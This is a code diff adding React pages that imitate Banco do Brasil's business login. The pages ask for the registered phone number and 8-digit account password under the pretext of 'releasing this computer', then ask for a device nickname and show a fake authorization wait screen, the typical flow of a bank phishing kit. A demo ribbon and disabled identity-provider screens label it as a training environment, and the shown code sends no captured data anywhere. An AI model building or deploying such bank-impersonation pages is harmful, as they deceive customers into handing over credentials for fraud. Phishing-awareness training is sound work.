+      <div className="pj-login-right" aria-hidden="true">
+        <img src={pjLoginReference} alt="" className="pj-login-hero" />
+      </div>
+
+      {isLoading && <PjLoadingOverlay />}
+    </main>
+  );
+}
+
+function PjPhoneUnlockPage() {
+  const [, setLocation] = useLocation();
+  const [phone, setPhone] = useState('');
+  const [verificationCode, setVerificationCode] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+
+  const isVerificationValid =
+    phone.replace(/\D/g, '').length === 11 && verificationCode.length === 8;
+
+  useEffect(() => {
+    if (!isLoading) return;
+
+    const timer = window.setTimeout(() => {
+      setIsLoading(false);
+      setLocation('/sign-in/dispositivo');
+    }, 2000);
+
+    return () => window.clearTimeout(timer);
+  }, [isLoading, setLocation]);
+
+  const handlePhoneChange = (value: string) => {
+    const digits = value.replace(/\D/g, '').slice(0, 11);
+
+    if (digits.length <= 2) {
+      setPhone(digits);
+    } else if (digits.length <= 7) {
+      setPhone(`(${digits.slice(0, 2)}) ${digits.slice(2)}`);
+    } else {
+      setPhone(`(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`);
+    }
+  };
+
+  const handleVerificationSubmit = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+
+    if (isVerificationValid) {
+      setIsLoading(true);
+    }
+  };
+
+  return (
+    <main className="token-page">
+      <button
+        type="button"
+        className="token-back"
+        onClick={() => setLocation('/sign-in')}
+        aria-label="Voltar"
+      >
+        <ArrowLeft size={22} strokeWidth={1.75} />
+      </button>
+
+      <section className="token-left">
+        <header className="token-header">
+          <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
+          <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
+        </header>
+
+        <div className="token-copy-block">
+          <p className="token-unlock">
+            Você precisa fazer a liberação deste computador para continuar o acesso.
+          </p>
+          <p className="token-hint">
+            Primeiro, Confirme o número de celular cadastrado para identificar esse computador.
+          </p>
+        </div>
+
+        <form className="token-form" onSubmit={handleVerificationSubmit}>
+          <div className="token-field">
+            <label className="token-label" htmlFor="verification-phone">
+              Confirme número de celular cadastrado:
+            </label>
+            <input
+              id="verification-phone"
+              className="token-input"
+              type="tel"
+              inputMode="numeric"
+              placeholder="(DDD) + Número"
+              value={phone}
+              onChange={event => handlePhoneChange(event.target.value)}
+              autoComplete="off"
+              required
+            />
+          </div>
+
+          <div className="token-field">
+            <label className="token-label" htmlFor="verification-code">
+              Senha de 8 dígitos:
+            </label>
+            <div className="token-password-wrapper">
+              <input
+                id="verification-code"
+                className="token-input"
+                type={showPassword ? 'text' : 'password'}
+                inputMode="numeric"
+                placeholder="SENHA 8 DÍGITOS"
+                value={verificationCode}
+                onChange={event =>
+                  setVerificationCode(event.target.value.replace(/\D/g, '').slice(0, 8))
+                }
+                maxLength={8}
+                autoComplete="off"
+                required
+              />
+              <button
+                type="button"
+                className="pj-password-toggle"
+                onClick={() => setShowPassword(!showPassword)}
+                aria-label={showPassword ? 'Ocultar senha de 8 dígitos' : 'Mostrar senha de 8 dígitos'}
+              >
+                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+              </button>
+            </div>
+          </div>
+
+          <button type="submit" className="token-submit" disabled={!isVerificationValid}>
+            AVANÇAR
+          </button>
+        </form>
+      </section>
+
+      <aside className="token-right" aria-hidden="true">
+        <img src={`${basePath}/token-hero.jpg`} alt="" className="token-hero" />
+      </aside>
+
+      <p className="token-legal">(c) Banco do Brasil</p>
+      <button type="button" className="token-chat" aria-label="Abrir chat">
+        <MessageCircle size={22} />
+      </button>
+
+      {isLoading && <PjLoadingOverlay />}
+    </main>
+  );
+}
+
+function PjDeviceNicknamePage() {
+  const [, setLocation] = useLocation();
+  const [deviceNickname, setDeviceNickname] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const trimmedNickname = deviceNickname.trim();
+  const isNicknameValid = trimmedNickname.length > 0;
+
+  const handleDeviceNicknameSubmit = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+
+    if (isNicknameValid) {
+      setIsLoading(true);
+    }
+  };
+
+  useEffect(() => {
+    if (!isLoading) return;
+
+    const timer = window.setTimeout(() => {
+      setLocation('/sign-in/autorizacao');
+    }, 2000);
+
+    return () => window.clearTimeout(timer);
+  }, [isLoading, setLocation]);
+
+  return (
+    <main className="token-page">
+      <button
+        type="button"
+        className="token-back"
+        onClick={() => setLocation('/sign-in/celular')}
+        aria-label="Voltar"
+      >
+        <ArrowLeft size={22} strokeWidth={1.75} />
+      </button>
+
+      <section className="token-left">
+        <header className="token-header">
+          <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
+          <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
+        </header>
+
+        <div className="token-copy-block">
+          <p className="token-unlock">
+            Você precisa fazer a liberação deste computador para continuar o acesso.
+          </p>
+          <p className="token-hint">
+            Escolha um apelido para identificar esse computador.
+            <br />
+            Para isso, utilize os campos abaixo:
+          </p>
+        </div>
+
+        <form className="token-form" onSubmit={handleDeviceNicknameSubmit}>
+          <div className="token-field">
+            <label className="token-label" htmlFor="device-nickname">
+              Apelido do computador
+            </label>
+            <input
+              id="device-nickname"
+              className="token-input"
+              type="text"
+              placeholder="Ex: Computador do joão"
+              value={deviceNickname}
+              onChange={event => setDeviceNickname(event.target.value.slice(0, 10))}
+              maxLength={10}
+              autoComplete="off"
+              required
+            />
+          </div>
+
+          <button type="submit" className="token-submit" disabled={!isNicknameValid}>
+            AVANÇAR
+          </button>
+        </form>
+      </section>
+
+      <aside className="token-right" aria-hidden="true">
+        <img src={`${basePath}/token-hero.jpg`} alt="" className="token-hero" />
+      </aside>
+
+      <p className="token-legal">(c) Banco do Brasil</p>
+      <button type="button" className="token-chat" aria-label="Abrir chat">
+        <MessageCircle size={22} />
+      </button>
+
+      {isLoading && <PjLoadingOverlay />}
+    </main>
+  );
+}
+
+function PjAuthorizationPage() {
+  return (
+    <main className="pj-auth-page">
+      <img
+        className="verification-background"
+        src={verificationBackground}
+        alt=""
+        aria-hidden="true"
+      />
+
+      <div className="pj-auth-modal" role="status" aria-live="polite">
+        <div className="pj-auth-card">
+          <section className="pj-auth-card-left">
+            <img
+              src={`${basePath}/bb-pj-white-logo.png`}
+              alt=""
+              className="pj-auth-card-logo"
+            />
+            <h1>Aguarde...</h1>
+            <p>
+              Não conseguimos identificar este dispositivo em sua lista de computadores
+              autorizados e seguros.
+              <br />
+              <br />
+              Estamos iniciando o processo de autorização e liberação deste computador. Seja
+              paciente.
+            </p>
+            <span className="pj-auth-big-loader" aria-hidden="true" />
+          </section>
+
+          <section className="pj-auth-card-right">
+            <header>INICIANDO SOLICITAÇÃO</header>
+            <div className="pj-auth-card-copy">
+              Aguarde alguns instantes, iremos dar continuidade com a autorização deste
+              computador.
+              <p>
+                <b>Chave de acesso:</b>
+              </p>
+            </div>
+            <hr />
+            <small>
+              Este processo é importante para manter sua conta segura, e com acessos por
+              dispositivos autorizados e seguros.
+            </small>
+            <span className="pj-auth-lock" aria-hidden="true">
+              <ChevronsRight size={18} strokeWidth={2.6} />
+            </span>
+          </section>
+        </div>
+      </div>
+    </main>
+  );
+}
+
+function AuthPage({ mode }: { mode: 'sign-in' | 'sign-up' }) {
+  return (
+    <main className="auth-page">
+      <section className="auth-showcase" aria-label="Conta digital">
+        <a className="auth-brand" href={basePath || '/'} aria-label="Voltar para a página inicial">
+          <img src={`${basePath}/logo.svg`} alt="BB Empresas" />
+        </a>
+        <div className="auth-showcase-copy">
+          <span className="auth-kicker">Banco do Brasil</span>
+          <h1>{mode === 'sign-in' ? 'Acesse sua conta' : 'Crie sua conta'}</h1>
+          <p>
+            {mode === 'sign-in'
+              ? 'Entre para acompanhar seus produtos e soluções do BB.'
+              : 'Tenha acesso a uma experiência digital simples e segura.'}
+          </p>
+        </div>
+        <div className="auth-showcase-shape" aria-hidden="true" />
+      </section>
+      <section className="auth-panel">
+        {mode === 'sign-in' ? (
+          <SignIn
+            routing="path"
+            path={`${basePath}/secure-login`}
+            signUpUrl={`${basePath}/sign-up`}
+          />
+        ) : (
+          <SignUp
+            routing="path"
+            path={`${basePath}/sign-up`}
+            signInUrl={`${basePath}/sign-in`}
+          />
+        )}
+      </section>
+    </main>
+  );
+}
+
+function UserPortalPage() {
+  const { isLoaded, isSignedIn } = useAuth();
+  const { user } = useUser();
+  const { signOut } = useClerk();
+  const [, setLocation] = useLocation();
+
+  if (!isLoaded) {
+    return <div className="portal-loading">Carregando sua conta...</div>;
+  }
+
+  if (!isSignedIn) {
+    return <RedirectToSignIn />;
+  }
+
+  const displayName = user?.firstName || user?.emailAddresses[0]?.emailAddress || 'cliente';
+
+  return (
+    <main className="portal-page">
+      <header className="portal-header">
+        <a href={basePath || '/'} aria-label="Voltar para a página inicial">
+          <img src={`${basePath}/logo.svg`} alt="BB Empresas" />
+        </a>
+        <button
+          type="button"
+          onClick={() => signOut({ redirectUrl: basePath || '/' })}
+          data-testid="button-sign-out"
+        >
+          Sair
+        </button>
+      </header>
+      <section className="portal-card">
+        <span className="auth-kicker">Área segura</span>
+        <h1>Olá, {displayName}.</h1>
+        <p>Você está conectado à sua conta. Esta é a sua área inicial de acesso.</p>
+        <button type="button" className="portal-home-button" onClick={() => setLocation('/')}>
+          Voltar para a página inicial
+        </button>
+      </section>
+    </main>
+  );
+}
+
+function ClerkApp() {
+  return (
+    <ClerkProvider
+      publishableKey={clerkPubKey}
+      proxyUrl={clerkProxyUrl}
+      appearance={clerkAppearance}
+      signInUrl={`${basePath}/secure-login`}
+      signUpUrl={`${basePath}/sign-up`}
+      localization={{
+        signIn: {
+          start: {
+            title: 'Acesse sua conta',
+            subtitle: 'Entre para continuar no Banco do Brasil',
+          },
+        },
+        signUp: {
+          start: {
+            title: 'Crie sua conta',
+            subtitle: 'Comece sua experiência no Banco do Brasil',
+          },
+        },
+      }}
+    >
+      <div className="training-app-shell">
+        <div className="training-app-content">
+          <Switch>
+            <Route path="/" component={HomeRedirect} />
+            <Route path="/pessoa-fisica/senha" component={AutoatendimentoPasswordPage} />
+            <Route path="/pessoa-fisica" component={AutoatendimentoPage} />
+            <Route path="/sign-in/celular" component={PjPhoneUnlockPage} />
+            <Route path="/sign-in/dispositivo" component={PjDeviceNicknamePage} />
+            <Route path="/sign-in/autorizacao" component={PjAuthorizationPage} />
+            <Route path="/sign-in" component={PjLoginPage} />
+            <Route path="/secure-login/*?" component={() => <AuthPage mode="sign-in" />} />
+            <Route path="/sign-up/*?" component={() => <AuthPage mode="sign-up" />} />
+            <Route path="/user-portal" component={UserPortalPage} />
+            <Route component={() => <Redirect to="/" />} />
+          </Switch>
+        </div>
+      </div>
+    </ClerkProvider>
+  );
+}
+
+function DemoRibbon() {
+  return (
+    <div className="demo-ribbon" role="note" data-testid="demo-ribbon">
+      <ShieldAlert size={13} aria-hidden="true" />
+      <span>Ambiente de demonstração — dados fictícios. Não insira credenciais reais.</span>
+    </div>
+  );
+}
+
+function ClerkDisabledNotice() {
+  const [, setLocation] = useLocation();
+  return (
+    <main className="demo-notice-page" data-testid="clerk-disabled-notice">
+      <div className="demo-notice-card">
+        <span className="demo-badge">Ambiente de demonstração</span>
+        <h1>Acesso indisponível no modo demonstração</h1>
+        <p>
+          Esta tela usa um provedor de identidade externo (Clerk) que está
+          desativado neste ambiente de treinamento. Nenhuma credencial real é
+          coletada ou transmitida aqui.
+        </p>
+        <button
+          type="button"
+          className="portal-home-button"
+          data-testid="clerk-notice-home"
+          onClick={() => setLocation('/')}
+        >
+          Voltar para a página inicial
+        </button>
+      </div>
+    </main>
+  );
+}
+
+function DemoApp() {
+  return (
+    <div className="training-app-shell">
+      <div className="training-app-content">
+        <Switch>
+          <Route path="/" component={HomePage} />
+          <Route path="/pessoa-fisica/senha" component={AutoatendimentoPasswordPage} />
+          <Route path="/pessoa-fisica" component={AutoatendimentoPage} />
+          <Route path="/sign-in/celular" component={PjPhoneUnlockPage} />
+          <Route path="/sign-in/dispositivo" component={PjDeviceNicknamePage} />
+          <Route path="/sign-in/autorizacao" component={PjAuthorizationPage} />
+          <Route path="/sign-in" component={PjLoginPage} />
+          <Route path="/secure-login/*?" component={ClerkDisabledNotice} />
+          <Route path="/sign-up/*?" component={ClerkDisabledNotice} />
+          <Route path="/user-portal" component={ClerkDisabledNotice} />
+          <Route component={() => <Redirect to="/" />} />
+        </Switch>
+      </div>
+    </div>
+  );
+}
+
+const clerkEnabled = Boolean(import.meta.env.VITE_CLERK_PUBLISHABLE_KEY);
+
+function App() {
+  return (
+    <WouterRouter base={basePath}>
+      <DemoRibbon />
+      {clerkEnabled ? <ClerkApp /> : <DemoApp />}
+    </WouterRouter>
+  );
+}
+
+export default App;
